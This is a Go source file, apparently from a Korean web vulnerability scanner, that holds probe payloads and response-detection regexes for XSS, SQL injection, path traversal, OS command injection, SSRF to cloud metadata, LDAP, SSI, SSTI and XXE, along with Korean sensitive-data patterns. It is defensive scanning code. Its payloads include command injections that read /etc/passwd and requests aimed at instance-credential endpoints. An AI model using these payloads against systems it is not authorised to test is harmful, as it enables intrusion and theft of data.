// Package payload — 페이로드/워드리스트 관리 (FR-3.7). 버전관리 + 현지화(한국형 패턴).
// Detector가 쓰는 XSS 페이로드와 한국형 중요정보 탐지 패턴을 한 곳에 두고, config로 확장한다.
package payload

import (
	"regexp"
	"strings"
	"sync"
)

// Version — 페이로드셋 버전 (변경 시 올림).
const Version = "2026.08.8" // +LDAP·SSI 인젝션 페이로드

// Pattern — 이름 붙은 탐지 정규식 (한국형 민감정보 등).
type Pattern struct {
	Name  string `json:"name" yaml:"name"`
	Regex string `json:"regex" yaml:"regex"`
	re    *regexp.Regexp
}

var (
	mu        sync.RWMutex
	xss       = builtinXSS()
	sensitive = compile(builtinSensitive())
	sqlErr    = compile(builtinSQLErrors())
	traversal = compile(builtinTraversalHits())
	cmdOut    = compile(builtinCmdOutHits())
	ssrfHit   = compile(builtinSSRFHits())
	ldapErr   = compile(builtinLDAPErrors())
)

func builtinXSS() []string {
	return []string{
		"<script>zqxj9()</script>",
		"\"><svg/onload=zqxj9()>",
		"'\"><img src=x onerror=zqxj9()>",
	}
}

// SQL 주입 페이로드 (에러기반, 비파괴 — 따옴표로 구문오류만 유발). FR-3.7.
func builtinSQLi() []string {
	return []string{"'", "\"", "')", "' OR '1'='1"}
}

// SQL 에러 시그니처 (DBMS별). 응답에 뜨면 주입 가능성.
func builtinSQLErrors() []Pattern {
	return []Pattern{
		{Name: "MySQL", Regex: `(?i)SQL syntax.*MySQL|you have an error in your sql syntax|mysql_fetch|MySqlException|valid MySQL result`},
		{Name: "PostgreSQL", Regex: `(?i)PostgreSQL.*ERROR|pg_query\(\)|PSQLException|unterminated quoted string`},
		{Name: "MSSQL", Regex: `(?i)Unclosed quotation mark|Microsoft SQL (Server|Native)|System\.Data\.SqlClient|SQLServerException`},
		{Name: "Oracle", Regex: `(?i)ORA-\d{5}|Oracle error|quoted string not properly terminated`},
		{Name: "SQLite", Regex: `(?i)SQLite/JDBCDriver|SQLite\.Exception|sqlite3\.OperationalError|unrecognized token|SQL logic error`},
	}
}

// 경로순회 페이로드 (읽기, 비파괴). FR-3.7.
func builtinTraversal() []string {
	return []string{
		"../../../../../../etc/passwd",
		"....//....//....//....//etc/passwd",
		"..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
		"../../../../../../windows/win.ini",
		"..\\..\\..\\..\\..\\windows\\win.ini",
	}
}

// 경로순회 성공 시그니처 (파일 내용). 응답에 뜨면 순회 성공.
func builtinTraversalHits() []Pattern {
	return []Pattern{
		{Name: "/etc/passwd", Regex: `root:[^:]*:0:0:`},
		{Name: "win.ini", Regex: `(?i)\[extensions\]|\[fonts\]|for 16-bit app support`},
	}
}

// ── OS 커맨드 인젝션 (CWE-78) ──────────────────────────────
// 출력 기반 페이로드: 무해한 명령(id/whoami/ver)을 셸 분리자로 이어붙여 출력 노출을 유도.
func builtinCmdInjection() []string {
	return []string{
		";id", "|id", "||id", "&&id", "`id`", "$(id)", "%0aid", // *nix
		";cat /etc/passwd", "|cat /etc/passwd", // passwd 유도(*nix)
		"&ver", "|ver", "&whoami", // Windows/nix
	}
}

// CmdInjection — 출력 기반 커맨드 인젝션 페이로드.
func CmdInjection() []string { return builtinCmdInjection() }

// CmdTimeDelay — 시간 기반(블라인드) 커맨드 인젝션 지연 초. detector 임계값과 공유.
const CmdTimeDelay = 5

// CmdInjectionTimePairs — 블라인드 커맨드 인젝션: (지연, 무지연) 페이로드 쌍.
func CmdInjectionTimePairs() [][2]string {
	return [][2]string{
		{";sleep 5", ";sleep 0"}, {"|sleep 5", "|sleep 0"},
		{"$(sleep 5)", "$(sleep 0)"}, {"`sleep 5`", "`sleep 0`"},
		{"&ping -n 6 127.0.0.1", "&ping -n 1 127.0.0.1"}, // Windows(≈5s vs 0s)
		{"&timeout 5", "&timeout 0"},                     // Windows
	}
}

// 커맨드 실행 성공 시그니처(무해 명령의 출력).
func builtinCmdOutHits() []Pattern {
	return []Pattern{
		{Name: "id 출력(uid/gid)", Regex: `uid=\d+\([a-z_][a-z0-9_-]*\)\s+gid=\d+`},
		{Name: "/etc/passwd", Regex: `root:[^:]*:0:0:`},
		{Name: "Windows 버전", Regex: `(?i)Microsoft Windows \[Version`},
	}
}

// FindCmdOutput — 응답에서 커맨드 실행 출력 시그니처 탐지.
func FindCmdOutput(s string) (name, match string) {
	mu.RLock()
	defer mu.RUnlock()
	for _, p := range cmdOut {
		if m := p.re.FindString(s); m != "" {
			return p.Name, m
		}
	}
	return "", ""
}

// ── SSRF (CWE-918) ─────────────────────────────────────────
// 내부/클라우드 메타데이터/파일 스킴을 url류 파라미터에 주입해 서버가 대신 요청하는지 확인.
func builtinSSRF() []string {
	return []string{
		"http://169.254.169.254/latest/meta-data/",            // AWS 메타데이터
		"http://metadata.google.internal/computeMetadata/v1/", // GCP 메타데이터
		"file:///etc/passwd",                                  // 로컬 파일
		"http://127.0.0.1/",                                   // 내부 루프백
	}
}

// SSRF — SSRF 페이로드(내부/메타데이터/파일).
func SSRF() []string { return builtinSSRF() }

// SSRF 성공 시그니처(서버가 내부 자원을 대신 요청해 응답에 노출).
func builtinSSRFHits() []Pattern {
	return []Pattern{
		{Name: "AWS 메타데이터", Regex: `(?i)ami-id|instance-id|iam/security-credentials|reservation-id|hostname|public-keys`},
		{Name: "GCP 메타데이터", Regex: `(?i)computeMetadata|Metadata-Flavor`},
		{Name: "/etc/passwd", Regex: `root:[^:]*:0:0:`},
	}
}

// FindSSRF — 응답에서 SSRF 성공 시그니처 탐지.
func FindSSRF(s string) (name, match string) {
	mu.RLock()
	defer mu.RUnlock()
	for _, p := range ssrfHit {
		if m := p.re.FindString(s); m != "" {
			return p.Name, m
		}
	}
	return "", ""
}

// ── LDAP 인젝션 (CWE-90) ──────────────────────────────────
// LDAP 필터 구문을 깨는 특수문자를 주입해 LDAP 오류(스택/파서)를 유발·노출로 판정(에러 기반).
func builtinLDAP() []string {
	return []string{"*", "*)(uid=*", "*)(|(uid=*))", ")(cn=*", "admin*)((|userPassword=*)", "*)(objectClass=*"}
}

// LDAP — LDAP 인젝션 페이로드.
func LDAP() []string { return builtinLDAP() }

// LDAP 오류 시그니처(파서·JNDI·API 오류). 응답에 뜨면 주입 가능성.
func builtinLDAPErrors() []Pattern {
	return []Pattern{
		{Name: "LDAP", Regex: `(?i)javax\.naming\.|LDAPException|com\.sun\.jndi\.ldap|invalid DN syntax|bad search filter|ldap_search|AcceptSecurityContext|supplied argument is not a valid ldap|Invalid attribute|ldap_bind`},
	}
}

// FindLDAPError — 응답에서 LDAP 오류 시그니처 탐지.
func FindLDAPError(s string) (name, match string) {
	mu.RLock()
	defer mu.RUnlock()
	for _, p := range ldapErr {
		if m := p.re.FindString(s); m != "" {
			return p.Name, m
		}
	}
	return "", ""
}

// ── SSI 인젝션 (CWE-97) ────────────────────────────────────
// SSI 지시자를 주입해 서버가 실행하면 고유 마커가 출력됨. 원본 지시자가 그대로 반사되면(미실행) 제외.
const SSIMarker = "SSI7333OK"

// SSIPayloads — SSI(#exec) 지시자로 무해한 echo 마커 출력을 유도.
func SSIPayloads() []string {
	return []string{
		`<!--#exec cmd="echo SSI7333OK"-->`,
		`<!--#exec cmd="echo${IFS}SSI7333OK"-->`,
	}
}

// ── SSTI 서버측 템플릿 인젝션 (CWE-1336) ──────────────────
// 산술식을 주입해 서버 템플릿 엔진이 평가하면 고유 결과값(7333*7333=53772889)이 응답에 나타남.
// 원본 식이 그대로 반사되면(미평가) SSTI 아님 → 결과값 존재 + 원본 부재로 구분.
const SSTIResult = "53772889" // 7333*7333

// SSTIPayloads — 주요 템플릿 엔진 산술 평가 페이로드.
func SSTIPayloads() []string {
	return []string{
		"${7333*7333}",     // FreeMarker · JSP EL · Spring
		"{{7333*7333}}",    // Jinja2 · Twig · Nunjucks · Angular
		"<%= 7333*7333 %>", // ERB · EJS
		"#{7333*7333}",     // Ruby · Thymeleaf · JSF
		"${{7333*7333}}",   // 일부 EL 변형
		"@(7333*7333)",     // Razor
	}
}

// ── XXE XML 외부객체 공격 (CWE-611) ───────────────────────
// 외부 엔티티로 로컬 파일(/etc/passwd·win.ini)을 참조. 파서가 처리하면 응답에 파일 내용 노출.
// 성공 시그니처는 경로순회와 동일(FindTraversal 재사용).
func XXEPayloads() []string {
	return []string{
		`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>`,
		`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>`,
	}
}

// 한국형 중요정보 패턴 (FR-3.7): 주민번호·카드·여권·계좌.
func builtinSensitive() []Pattern {
	return []Pattern{
		{Name: "주민등록번호", Regex: `\b\d{6}-[1-8]\d{6}\b`},
		{Name: "카드번호", Regex: `\b\d{4}-\d{4}-\d{4}-\d{4}\b`},
		{Name: "여권번호", Regex: `\b[MSRODmsrod]\d{8}\b`},
		{Name: "계좌번호", Regex: `\b\d{2,6}-\d{2,6}-\d{2,6}\b`},
	}
}

func compile(pats []Pattern) []Pattern {
	out := make([]Pattern, 0, len(pats))
	for _, p := range pats {
		if re, err := regexp.Compile(p.Regex); err == nil {
			p.re = re
			out = append(out, p)
		}
	}
	return out
}

// XSS — 현재 XSS 페이로드 목록.
func XSS() []string {
	mu.RLock()
	defer mu.RUnlock()
	return append([]string(nil), xss...)
}

// FindSensitive — 문자열에서 한국형 민감정보 탐지, 발견 종류 반환 (FR-3.7).
func FindSensitive(s string) []string {
	kinds, _ := FindSensitiveAt(s)
	return kinds
}

// FindSensitiveAt — 발견 종류 + 첫 매칭 위치의 부분문자열(증적 스니펫 위치용, 그대로 저장 금지).
// 카드번호는 Luhn 검증으로 무작위 16자리(주문번호 등) 오탐을 배제한다.
func FindSensitiveAt(s string) (kinds []string, first string) {
	mu.RLock()
	defer mu.RUnlock()
	for _, p := range sensitive {
		m := p.re.FindString(s)
		if m == "" {
			continue
		}
		if p.Name == "카드번호" { // Luhn 통과하는 후보만 카드로 인정
			m = firstLuhnValid(p.re.FindAllString(s, -1))
			if m == "" {
				continue
			}
		}
		if p.Name == "계좌번호" { // 날짜·전화·자릿수 오탐 배제(정밀도 2차)
			m = firstMatch(p.re.FindAllString(s, -1), accountValid)
			if m == "" {
				continue
			}
		}
		kinds = append(kinds, p.Name)
		if first == "" {
			first = m
		}
	}
	return kinds, first
}

// firstLuhnValid — 후보 중 Luhn 검증을 통과하는 첫 문자열("" = 없음).
func firstLuhnValid(cands []string) string { return firstMatch(cands, luhnValid) }

// firstMatch — 후보 중 검증 함수를 통과하는 첫 문자열("" = 없음).
func firstMatch(cands []string, ok func(string) bool) string {
	for _, c := range cands {
		if ok(c) {
			return c
		}
	}
	return ""
}

// accountValid — 계좌번호 후보의 오탐(날짜·전화번호·자릿수 미달)을 배제한다(정밀도 2차).
// 한국 계좌번호는 통상 10~16자리이고, ISO 날짜(YYYY-MM-DD)나 전화번호(0으로 시작·≤11자리)와 다르다.
func accountValid(s string) bool {
	digits := 0
	for _, r := range s {
		if r >= '0' && r <= '9' {
			digits++
		}
	}
	if digits < 10 || digits > 16 { // 계좌 통상 자릿수 밖 → 날짜(8자리)·짧은 코드 배제
		return false
	}
	if isDateLike(s) { // 2026-08-07 같은 날짜(자릿수 통과해도) 배제
		return false
	}
	if digits <= 11 && strings.HasPrefix(s, "0") { // 0으로 시작하는 ≤11자리 → 전화번호로 간주
		return false
	}
	return true
}

// isDateLike — YYYY-MM-DD 형태(연 1900~2099, 월 1~12, 일 1~31)면 true.
func isDateLike(s string) bool {
	parts := strings.Split(s, "-")
	if len(parts) != 3 || len(parts[0]) != 4 {
		return false
	}
	y, mo, d := atoi(parts[0]), atoi(parts[1]), atoi(parts[2])
	return y >= 1900 && y <= 2099 && mo >= 1 && mo <= 12 && d >= 1 && d <= 31
}

func atoi(s string) int {
	n := 0
	for _, r := range s {
		if r < '0' || r > '9' {
			return -1
		}
		n = n*10 + int(r-'0')
	}
	return n
}

// luhnValid — 숫자 문자열(구분자 무시)의 Luhn 체크섬 검증.
func luhnValid(s string) bool {
	var digits []int
	for _, r := range s {
		if r >= '0' && r <= '9' {
			digits = append(digits, int(r-'0'))
		}
	}
	if len(digits) < 12 {
		return false
	}
	sum, alt := 0, false
	for i := len(digits) - 1; i >= 0; i-- {
		d := digits[i]
		if alt {
			if d *= 2; d > 9 {
				d -= 9
			}
		}
		sum += d
		alt = !alt
	}
	return sum%10 == 0
}

// SQLi — SQL 주입 페이로드 목록.
func SQLi() []string { return builtinSQLi() }

// SQLiTimeDelay — 시간 기반 블라인드 페이로드의 지연 초. detector 임계값과 공유.
const SQLiTimeDelay = 3

// SQLiTimePairs — 시간 기반 블라인드 SQLi 의 (지연, 무지연) 접미사 쌍.
// 지연 페이로드는 ~3초 지연(SLEEP/WAITFOR/pg_sleep), 무지연은 동일 구조에 0초.
// 응답 내용 차이가 전혀 없는 완전 블라인드를 응답 시간 차이로 판정한다.
func SQLiTimePairs() [][2]string {
	return [][2]string{
		{"' AND SLEEP(3)-- -", "' AND SLEEP(0)-- -"},                                                               // MySQL 문자열
		{" AND SLEEP(3)", " AND SLEEP(0)"},                                                                         // MySQL 숫자
		{"'; WAITFOR DELAY '0:0:3'-- -", "'; WAITFOR DELAY '0:0:0'-- -"},                                           // MSSQL
		{"' AND (SELECT 1 FROM pg_sleep(3)) IS NOT NULL-- -", "' AND (SELECT 1 FROM pg_sleep(0)) IS NOT NULL-- -"}, // PostgreSQL
	}
}

// SQLiBlindPairs — 불린 기반 블라인드 SQLi 의 (참, 거짓) 접미사 쌍.
// 대상 파라미터 원본값 뒤에 붙여 참/거짓 조건 응답 차이를 관찰(에러 없이 주입 여부 판정).
// 숫자 문맥·문자열(따옴표) 문맥·주석 종료를 모두 시도. 전부 비파괴(SELECT 조건).
func SQLiBlindPairs() [][2]string {
	return [][2]string{
		{" AND 1=1", " AND 1=2"},           // 숫자 문맥
		{"' AND '1'='1", "' AND '1'='2"},   // 문자열(따옴표) 문맥
		{"' AND 1=1-- -", "' AND 1=2-- -"}, // 따옴표 탈출 + 주석 종료
	}
}

// Traversal — 경로순회 페이로드 목록.
func Traversal() []string { return builtinTraversal() }

// FindSQLError — 응답에서 DBMS 에러 시그니처 탐지. 매칭 DBMS명·매칭문자열 반환("" = 없음).
func FindSQLError(s string) (name, match string) {
	mu.RLock()
	defer mu.RUnlock()
	for _, p := range sqlErr {
		if m := p.re.FindString(s); m != "" {
			return p.Name, m
		}
	}
	return "", ""
}

// FindTraversal — 응답에서 파일 내용 시그니처 탐지. 매칭 파일명·매칭문자열 반환("" = 없음).
func FindTraversal(s string) (name, match string) {
	mu.RLock()
	defer mu.RUnlock()
	for _, p := range traversal {
		if m := p.re.FindString(s); m != "" {
			return p.Name, m
		}
	}
	return "", ""
}

// SetXSS — XSS 페이로드 추가(config 확장). 비면 무시.
func SetXSS(extra []string) {
	if len(extra) == 0 {
		return
	}
	mu.Lock()
	xss = append(builtinXSS(), extra...)
	mu.Unlock()
}

// AddSensitive — 한국형/사용자 정의 패턴 추가(config 확장).
func AddSensitive(pats []Pattern) {
	if len(pats) == 0 {
		return
	}
	mu.Lock()
	sensitive = append(compile(builtinSensitive()), compile(pats)...)
	mu.Unlock()
}

// Info — 페이로드셋 요약 (MCP list_payloads).
func Info() map[string]any {
	mu.RLock()
	defer mu.RUnlock()
	names := make([]string, 0, len(sensitive))
	for _, p := range sensitive {
		names = append(names, p.Name)
	}
	return map[string]any{
		"version":            Version,
		"xss":                append([]string(nil), xss...),
		"sensitive_patterns": names,
	}
}
